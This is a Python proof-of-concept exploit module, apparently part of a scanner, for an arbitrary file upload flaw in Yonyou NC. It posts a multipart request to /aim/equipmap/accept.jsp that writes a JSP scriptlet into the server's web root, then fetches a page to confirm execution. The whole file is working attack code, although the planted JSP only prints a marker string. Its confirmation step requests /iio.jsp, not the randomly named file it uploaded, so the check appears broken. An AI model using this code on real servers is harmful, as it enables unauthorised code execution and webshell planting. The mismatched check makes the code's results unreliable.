'''
Function:
    用友nc 任意文件上传
Author:
    spmonkey，夜梓月
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import random
import string
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
            'Accept-Encoding': 'gzip'
        }
        self.proxies = proxies
        self.result_text = ""

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def vuln(self, netloc, scheme):
        url = "{}://{}/aim/equipmap/accept.jsp".format(scheme, netloc)
        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        filename = "test" + char
        data = {
        'file': ('images.jpg', '<% out.println("bea86d66a5278f9e6fa1112d2e2fcebf"); %>', 'image/jpeg'),
        'fname':(None,'/webapps/nc_web/{}.jsp'.format(filename),'image/jpeg')
    }
        try:
            result = requests.post(url=url, files=data, headers=self.headers, verify=False, proxies=self.proxies)
            req = requests.get("{}://{}/iio.jsp".format(scheme, netloc), headers=self.headers, verify=False, allow_redirects=False, proxies=self.proxies)
            if req.status_code == 200 and "bea86d66a5278f9e6fa1112d2e2fcebf" in req.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n"
                bodys = result.request.body.decode().split("\r\n")
                for body in bodys:
                    self.result_text += "\n                 {}".format(body)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False